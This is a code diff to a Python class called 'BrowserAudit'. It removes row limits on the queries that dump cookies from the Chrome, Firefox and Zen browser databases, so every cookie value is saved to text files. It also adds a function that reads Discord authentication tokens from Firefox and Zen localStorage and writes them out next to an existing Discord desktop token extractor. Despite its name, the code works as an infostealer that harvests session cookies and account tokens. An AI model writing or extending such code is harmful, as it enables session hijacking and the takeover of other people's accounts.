@@ -103,7 +103,7 @@ class BrowserAudit:
         try:
             conn = sqlite3.connect(path)
             cursor = conn.cursor()
-            cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 50")
+            cursor.execute("SELECT host_key, name, value FROM cookies")
 
             with open(self.cookies_dir / "chrome_cookies.txt", 'w') as f:
                 for host, name, value in cursor.fetchall():
@@ -133,7 +133,7 @@ class BrowserAudit:
                 if cookies_file.exists():
                     conn = sqlite3.connect(cookies_file)
                     cursor = conn.cursor()
-                    cursor.execute("SELECT host, name, value FROM moz_cookies LIMIT 50")
+                    cursor.execute("SELECT host, name, value FROM moz_cookies")
 
                     with open(self.cookies_dir / "firefox_cookies.txt", 'w') as f:
                         for host, name, value in cursor.fetchall():
@@ -167,7 +167,7 @@ class BrowserAudit:
                 if cookies_file.exists():
                     conn = sqlite3.connect(cookies_file)
                     cursor = conn.cursor()
-                    cursor.execute("SELECT host, name, value FROM moz_cookies LIMIT 50")
+                    cursor.execute("SELECT host, name, value FROM moz_cookies")
 
                     with open(self.cookies_dir / "zen_cookies.txt", 'w') as f:
                         for host, name, value in cursor.fetchall():
@@ -181,6 +181,46 @@ class BrowserAudit:
             print(f"{self.COLORS['GREEN']}[OK] Zen cookies extracted{self.COLORS['RESET']}\n")
         except Exception as e:
             self.log("ERROR", f"Zen extraction failed: {e}")
+
+    def extract_discord_web_tokens(self):
+        print(f"{self.COLORS['CYAN']}[*] Extracting Discord Web tokens (localStorage)...{self.COLORS['RESET']}")
+
+        if self.os_type == 'darwin':
+            firefox_profiles = self.home / "Library/Application Support/Firefox/Profiles"
+            zen_profiles = self.home / "Library/Application Support/zen/Profiles"
+        else:
+            firefox_profiles = self.home / ".mozilla/firefox"
+            zen_profiles_alt = self.home / ".zen"
+            zen_profiles = self.home / ".config/zen/Profiles" if not zen_profiles_alt.exists() else zen_profiles_alt
+
+        found_any = False
+
+        for profile_dir in list(firefox_profiles.glob("*/")) + list(zen_profiles.glob("*/")):
+            localStorage_path = profile_dir / "storage/default/https+++discord.com/ls/data.sqlite"
+
+            if not localStorage_path.exists():
+                continue
+
+            try:
+                conn = sqlite3.connect(localStorage_path)
+                cursor = conn.cursor()
+                cursor.execute("SELECT key, value FROM data WHERE key='token'")
+
+                for key, value in cursor.fetchall():
+                    if value and len(str(value)) > 50:
+                        with open(self.cookies_dir / "discord_web_tokens.txt", 'a') as f:
+                            f.write(f"[Discord Web localStorage]\n")
+                            f.write(f"Key: {key}\n")
+                            f.write(f"Token: {value}\n")
+                            f.write("-" * 60 + "\n\n")
+                        found_any = True
+
+                conn.close()
+            except Exception as e:
+                self.log("DEBUG", f"Discord Web token extraction: {e}")
+
+        if found_any:
+            print(f"{self.COLORS['GREEN']}[OK] Discord Web tokens extracted{self.COLORS['RESET']}\n")
 
     def extract_discord_tokens(self):
         try:
@@ -250,6 +290,7 @@ class BrowserAudit:
             ("chrome_cookies.txt", "Chrome Cookies"),
             ("firefox_cookies.txt", "Firefox Cookies"),
             ("zen_cookies.txt", "Zen Cookies"),
+            ("discord_web_tokens.txt", "Discord Web Tokens (localStorage)"),
             ("discord_tokens.txt", "Discord Desktop Tokens"),
         ]
 
@@ -286,6 +327,7 @@ class BrowserAudit:
         self.extract_chrome_cookies()
         self.extract_firefox_cookies()
         self.extract_zen_cookies()
+        self.extract_discord_web_tokens()
         self.extract_discord_tokens()
 
         self.display_results()
